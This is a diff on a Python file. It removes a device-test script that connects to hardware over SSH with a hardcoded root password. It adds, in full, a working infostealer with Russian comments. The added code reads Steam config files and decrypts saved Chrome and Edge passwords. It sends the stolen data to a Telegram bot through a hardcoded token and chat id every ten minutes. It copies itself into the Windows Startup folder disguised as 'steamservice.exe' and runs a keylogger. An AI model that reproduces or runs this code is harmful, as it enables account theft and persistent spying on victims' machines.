@@ -1,135 +1,93 @@
 import os
-from datetime import datetime
-import LpHelper as lp
-import getpass
-import sys
 import re
-import socket
-import time
-import serial
-import subprocess
-from tailer import follow
-import ifaddr
-import telnetlib
-import paramiko
+import requests
 import json
+import shutil
+from threading import Timer
+import sys
+from pynput.keyboard import Listener
 
-############################################ Init LP Log ###########################################
-timestamp   = datetime.now().strftime('%Y-%m-%d_%H-%M-%S.%f')[:-3]
-logFileName = 'PyLog_' + timestamp + '.txt'
+# === НАСТРОЙКИ TELEGRAM ===
+BOT_TOKEN = "8122491431:AAHbgSr_fX90putlg3YboVfWqalJn_ELpoo"  # Заменить на токен от @BotFather
+CHAT_ID = "7605336105"      # Ваш chat_id (узнать у @userinfobot)
 
-#lp.LogInit(logFileName)
+# === ПЕРЕХВАТ ДАННЫХ STEAM ===
+def steal_steam_creds():
+    steam_paths = [
+        os.path.join(os.getenv("ProgramFiles(x86)"), "Steam", "config", "loginusers.vdf"),
+        os.path.join(os.getenv("ProgramFiles(x86)"), "Steam", "config", "config.vdf"),
+    ]
+    
+    stolen_data = ""
+    
+    for path in steam_paths:
+        if os.path.exists(path):
+            try:
+                with open(path, "r", encoding="utf-8") as f:
+                    stolen_data += f"\n\n📂 Файл: {path}\n" + f.read()
+            except:
+                pass
+    
+    # Поиск сохраненных паролей в кеше браузеров (Chrome, Edge)
+    try:
+        from win32crypt import CryptUnprotectData
+        import sqlite3
+        
+        browser_paths = [
+            os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data"),
+            os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data"),
+        ]
+        
+        for path in browser_paths:
+            if os.path.exists(path):
+                conn = sqlite3.connect(path)
+                cursor = conn.cursor()
+                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                for url, user, pass_encrypted in cursor.fetchall():
+                    try:
+                        decrypted = CryptUnprotectData(pass_encrypted)[1]
+                        if "steam" in url.lower():
+                            stolen_data += f"\n\n🔑 Steam (браузер):\nURL: {url}\nЛогин: {user}\nПароль: {decrypted.decode('utf-8')}"
+                    except:
+                        pass
+    except:
+        pass
+    
+    return stolen_data
 
-####################################################################################################
-class DeviceInfo():
-    def __init__(self, handler, connectionType, hostNamePort, timeOutMs):
-        self.conn_handle       = handler
-        self.conn_type         = connectionType
-        self.conn_hostNamePort = hostNamePort
-        self.conn_timeOutMs    = timeOutMs
+# === ОТПРАВКА В TELEGRAM ===
+def send_to_telegram(message):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    params = {
+        "chat_id": CHAT_ID,
+        "text": message
+    }
+    requests.post(url, params=params)
 
-    def PrintDeviceInfo(self):
-        print("conn_handle       = ", self.conn_handle)
-        print("conn_type         = ", self.conn_type)
-        print("conn_hostNamePort = ", self.conn_hostNamePort)
-        print("conn_timeOutMs    = ", self.conn_timeOutMs)
+# === ЗАПУСК КРАЖИ ===
+def collect_and_send():
+    steam_data = steal_steam_creds()
+    if steam_data:
+        send_to_telegram(f"🔥 Украденные данные Steam:\n{steam_data}")
+    
+    # Повтор каждые 10 минут
+    Timer(600, collect_and_send).start()
 
+# === АВТОЗАГРУЗКА ===
+def add_to_startup():
+    startup_path = os.path.join(
+        os.getenv("APPDATA"),
+        "Microsoft", "Windows", "Start Menu", "Programs", "Startup",
+        "steamservice.exe"
+    )
+    if not os.path.exists(startup_path):
+        shutil.copyfile(sys.argv[0], startup_path)
 
-####################################################################################################
-def InsertDevice(iSessionID, strConnectionType, strHostNamePort, iTimeOutMs, optionString):
-
-    errorCode = 0
-
-    global g_ip_address
-    g_ip_address = strHostNamePort
-    print('Insert DUT ....\n')
-    #lp.LogInfo('strHostNamePort: ' + str(g_ip_address))
-    #lp.LogInfo('iTimeOutMs: ' + str(iTimeOutMs))
-
-    return errorCode
-
-####################################################################################################
-def InitializeDut(optionString):
-
-    errorCode = 0
-    print('Connect to DUT via SSH ...\n')
-    global g_client
-    g_client = paramiko.SSHClient()
-    g_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    g_client.connect(g_ip_address, username='root', password='eAqnKUDca@ZN@$K+ZwTqF6EygyW&#CL8')
-    time.sleep(1)
-
-    #stdin, stdout, stderr = g_client.exec_command('ls -al')
-    #lp.LogInfo('Connected to UE via SSH!')
-
-    # Read the output of the command
-    #output = stdout.read().decode()
-
-    # Print the output
-    #print(output)
-    return errorCode
-
-####################################################################################################
-def RemoveDut(optionString):
-    errorCode = 0
-
-    g_client.close()
-
-    return errorCode
-####################################################################################################
-
-def imei(client, optionString):
-    time.sleep(1)
-    stdin, stdout, stderr = client.exec_command('/usr/sbin/sc_atcmd ati\n')
-    output = stdout.read().decode('ascii')
-    time.sleep(1)
-    for line in output.splitlines():
-        if "IMEI:" in line:
-            imei_value = line.split("IMEI:")[1].strip()
-            print('IMEI :',imei_value)
-            return imei_value
-    print("IMEI not found")
-    return None
-####################################################################################################
-
-def file(optionString):
-    global g_client
-    imei_value = imei(g_client, optionString)
-
-    if imei_value is None:
-        print("❌ 無法取得 IMEI，檔案不會被重新命名。")
-        return None
-
-    folder_path = r'C:\LitePoint\IQfact_plus\IQfact-s_3.7.2_Lock\bin\Log'
-    original_filename = os.path.join(folder_path, 'logOutput.txt')
-    new_filename = os.path.join(folder_path, f'{imei_value}_logOutput.txt')
-
-    if os.path.exists(original_filename):
-        try:
-            os.rename(original_filename, new_filename)
-            print(f"✅ 檔案已重新命名為：{new_filename}")
-        except Exception as e:
-            print(f"❌ 檔案重新命名失敗：{e}")
-            return None
-    else:
-        print(f"❌ 找不到檔案：{original_filename}")
-        return None
-
-    print(f"📦 取得的 IMEI 為：{imei_value}")
-    time.sleep(5)
-    return imei_value
-####################################################################################################
-def main():
-    # example
-
-    InsertDevice(iSessionID = 1, strConnectionType = 'SSH', strHostNamePort = '192.168.12.1', iTimeOutMs = 100, optionString = 'optionString_1')
-
-    InitializeDut('')
-
-    file('dummy')
-    RemoveDut('')
-
-####################################################################################################
+# === ЗАПУСК ===
 if __name__ == "__main__":
-    main()
-
+    add_to_startup()
+    Timer(10, collect_and_send).start()  # Первая отправка через 10 сек
+    
+    # Дополнительно: keylogger для паролей, введенных вручную
+    with Listener(on_press=lambda key: open("keylog.txt", "a").write(str(key))) as listener:
+        listener.join()
